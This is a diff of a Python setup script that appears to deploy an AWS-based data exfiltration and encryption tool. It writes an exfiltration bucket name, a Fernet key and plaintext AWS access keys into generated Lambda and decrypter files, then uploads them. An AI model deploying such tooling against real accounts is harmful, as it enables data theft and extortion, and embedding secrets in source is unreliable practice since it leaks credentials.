@@ -88,15 +88,15 @@ print("Modifying template files...")
 print("Sample function setup...")
 #######Sample function setup
 #------------------Modifying data------------------
-with open('sampleFunction_template.py','r') as f:
+with open('sampleFunction.py','r') as f:
 	lines = f.readlines()
 	#print(lines)
-with open('sampleFunction_template.py','w') as f:
+with open('sampleFunction.py','w') as f:
 	lines.insert(3, str("exfiltration_bucket_name = " + "'" + exfiltration_bucket_name + "'\n"))
 	f.write("".join(lines))
 #------------------Compressing------------------
 zipObj = ZipFile('sampleFunction.zip', 'w')
-zipObj.write('sampleFunction_template.py')
+zipObj.write('sampleFunction.py')
 zipObj.close()
 #------------------Upload function to s3 bucket--------
 s3_resource.meta.client.upload_file('sampleFunction.zip', template_bucket_name, 'sampleFunction.zip')
@@ -104,30 +104,30 @@ s3_resource.meta.client.upload_file('sampleFunction.zip', template_bucket_name, 
 #######Orchestrator setup
 print("Orchestrator setup...")
 #------------------Modifying data------------------
-with open('orchestrator_template.py','r') as f:
+with open('orchestrator.py','r') as f:
 	lines = f.readlines()
 	#print(lines)
-with open('orchestrator_template.py','w') as f:
+with open('orchestrator.py','w') as f:
 	lines.insert(6, str("template_bucket_name = " + "'" + template_bucket_name + "'\n"))
 	lines.insert(7, str("compressed_function_name = " + "'" + "sampleFunction.zip" + "'\n"))
 	lines.insert(8, str("lambda_s3_iam_role = " + "'" + iam_role_arn + "'\n"))
 	f.write("".join(lines))
 #-----------------Compressing----------------
-zipObj = ZipFile('orchestrator_template.zip','w')
-zipObj.write('orchestrator_template.py')
+zipObj = ZipFile('orchestrator.zip','w')
+zipObj.write('orchestrator.py')
 zipObj.close()
 #-----------------Upload function to s3 bucket---------
-s3_resource.meta.client.upload_file('orchestrator_template.zip', template_bucket_name, 'orchestrator_template.zip')
+s3_resource.meta.client.upload_file('orchestrator.zip', template_bucket_name, 'orchestrator.zip')
 #-----------------Create lambda function based on previous template--------------
 aws_lambda = session.client('lambda')
 aws_lambda.create_function(
         FunctionName = orchestrator_name,
         Runtime = 'python3.7',
         Role = iam_role_arn,
-        Handler = 'orchestrator_template.lambda_handler',
+        Handler = 'orchestrator.lambda_handler',
         Code = {
             'S3Bucket': template_bucket_name,
-            'S3Key': 'orchestrator_template.zip'
+            'S3Key': 'orchestrator.zip'
             },
         Timeout = 300,
         MemorySize = 512 
@@ -137,10 +137,10 @@ aws_lambda.create_function(
 #######Decrypter setup
 print("Decrypter setup...")
 #------------------Modifying data------------------
-with open('decrypter_template.py','r') as f:
+with open('decrypter.py','r') as f:
 	lines = f.readlines()
 	#print(lines)
-with open('decrypter_template.py','w') as f:
+with open('decrypter.py','w') as f:
 	lines.insert(9, str("key = " + "b" + "'" + fernet_key.decode() + "'\n"))
 	lines.insert(10, str("aws_access_key_id = " + "'" + aws_access_key + "'\n"))
 	lines.insert(11, str("aws_secret_access_key = " + "'" + aws_secret_access_key + "'\n"))
@@ -167,7 +167,7 @@ with open('standaloneClient_template.py','w') as f:
 
 print("...All files modified!")
 print('-------------------------------------------------')
-print('Setup is complete! client and decrypter can be now renamed :)')
+print('Setup is complete!')
 
 
 
